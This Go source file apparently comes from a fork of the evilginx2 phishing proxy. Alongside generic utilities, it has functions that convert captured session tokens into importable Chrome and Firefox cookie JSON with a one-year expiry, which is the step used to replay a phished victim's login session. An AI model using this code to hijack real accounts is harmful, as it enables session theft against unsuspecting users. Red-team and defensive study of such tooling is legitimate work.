package core

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"math"
	"os"
	"path/filepath"
	"strconv"
	"time"

	"github.com/shirou/gopsutil/disk"
	"github.com/shirou/gopsutil/host"

	"github.com/kgretzky/evilginx2/database"
)

func GenRandomToken() string {
	rdata := make([]byte, 64)
	rand.Read(rdata)
	hash := sha256.Sum256(rdata)
	token := fmt.Sprintf("%x", hash)
	return token
}

func GenRandomString(n int) string {
	const lb = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	for i := range b {
		t := make([]byte, 1)
		rand.Read(t)
		b[i] = lb[int(t[0])%len(lb)]
	}
	return string(b)
}

func GenRandomAlphanumString(n int) string {
	const lb = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		t := make([]byte, 1)
		rand.Read(t)
		b[i] = lb[int(t[0])%len(lb)]
	}
	return string(b)
}

func CreateDir(path string, perm os.FileMode) error {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		err = os.Mkdir(path, perm)
		if err != nil {
			return err
		}
	}
	return nil
}

//this function is supposed to be a helper for tokenToCookie, but right now there is type confusion, so it goes basically unused
/**
func tokensToJSON(tokens map[string]map[string]*database.Token, cookies []*Cookie) []*Cookie {
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	return cookies
}
**/

func tokensToCookieChromium(tokens map[string]map[string]*database.Token) string {
	//this function probably exports as a EditThisCookie json https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg/related?hl=de

	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	json, _ := json.Marshal(cookies)
	return string(json)
}

func tokensToCookieFf(tokens map[string]map[string]*database.Token) string {
	//this function is very similar to tokenToJSON, but it is intended for https://github.com/ysard/cookie-quick-manager/

	type Cookie struct {
		Domain         string `json:"Host raw"`
		Name           string `json:"Name raw"`
		Path           string `json:"Path raw"`
		Value          string `json:"Content raw"`
		ExpirationDate int64  `json:"Expires raw"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = "https://" + domain[1:] + "/"
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	json, _ := json.Marshal(cookies)
	return string(json)
}

func tokensToCookie(tokens map[string]map[string]*database.Token, browser string) string {
	if browser == "Ff" {
		return tokensToCookieFf(tokens)
	} else if browser == "Chromium" {
		return tokensToCookieChromium(tokens)
	} else {
		panic("Invalid Browser")
	}
}

func AsHTMLTable(header []string, table [][]string) string {
	var html string

	//new table
	html = "<table>"
	//headers
	html = html + "<tr>"
	for _, element := range header {
		html = html + "<th>" + element + "</th>"
	}
	html = html + "</tr>"
	//content
	for _, row := range table {
		html = html + "<tr>"
		for _, rowelement := range row {
			html = html + "<td>" + rowelement + "</td>"
		}
		html = html + "</tr>"
	}
	html = html + "</table>"

	return (html)
}

// gets some information about the current system status
func getStatus() string {
	var r string

	r = "Current time: " + time.Now().String()
	hostinfo, _ := host.Info()
	r = r + "\nHostname: " + hostinfo.Hostname
	diskusage, _ := disk.Usage("/")
	r = r + "\nDisk Free: " + strconv.FormatUint(diskusage.Free/1024/1024, 10) + "MB"
	logsize, _ := DirSize("/app/log")
	r = r + "\n'/app/log/'-size: " + HumanFileSize(logsize)

	return (r)
}

// get filesize as int64, return human readable string
// from https://hakk.dev/docs/golang-convert-file-size-human-readable/
func HumanFileSize(size int64) string {
	if size == 0 {
		return "0B"
	}

	suffixes := []string{"B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"}

	base := math.Log(float64(size)) / math.Log(1024)
	getSize := Round(math.Pow(1024, base-math.Floor(base)), .5, 2)
	getSuffix := suffixes[int(math.Floor(base))]
	return strconv.FormatFloat(getSize, 'f', -1, 64) + " " + string(getSuffix)
}

// from https://hakk.dev/docs/golang-convert-file-size-human-readable/
func Round(val float64, roundOn float64, places int) (newVal float64) {
	var round float64
	pow := math.Pow(10, float64(places))
	digit := pow * val
	_, div := math.Modf(digit)
	if div >= roundOn {
		round = math.Ceil(digit)
	} else {
		round = math.Floor(digit)
	}
	newVal = round / pow
	return
}

// from https://stackoverflow.com/a/32482941
func DirSize(path string) (int64, error) {
	var size int64
	err := filepath.Walk(path, func(_ string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			size += info.Size()
		}
		return err
	})
	return size, err
}

// from https://stackoverflow.com/a/61469854
func stringchunk(s string, chunkSize int) []string {
	if len(s) == 0 {
		return nil
	}
	if chunkSize >= len(s) {
		return []string{s}
	}
	var chunks []string = make([]string, 0, (len(s)-1)/chunkSize+1)
	currentLen := 0
	currentStart := 0
	for i := range s {
		if currentLen == chunkSize {
			chunks = append(chunks, s[currentStart:i])
			currentLen = 0
			currentStart = i
		}
		currentLen++
	}
	chunks = append(chunks, s[currentStart:])
	return chunks
}
